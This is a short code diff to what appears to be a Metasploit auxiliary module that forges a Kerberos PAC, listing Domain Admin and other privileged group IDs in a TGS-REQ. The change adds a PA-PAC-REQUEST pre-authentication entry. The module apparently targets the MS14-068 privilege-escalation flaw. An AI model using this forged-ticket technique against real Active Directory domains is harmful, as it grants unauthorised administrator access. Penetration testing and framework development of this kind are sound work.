@@ -64,6 +64,9 @@ class Metasploit4 < Msf::Auxiliary
 
     print_status("Sending TGS-REQ...")
 
+    pre_auth = []
+    pre_auth << build_pa_pac_request
+
     pac = build_pac(
       client_name: 'juan',
       group_ids: [513, 512, 520, 518, 519],
@@ -84,7 +87,8 @@ class Metasploit4 < Msf::Auxiliary
       ticket: ticket,
       group_ids: [513, 512, 520, 518, 519],
       domain_id: 'S-1-5-21-1755879683-3641577184-3486455962',
-      auth_data: auth_data
+      auth_data: auth_data,
+      pa_data: pre_auth
     )
 
     unless res.msg_type == 13
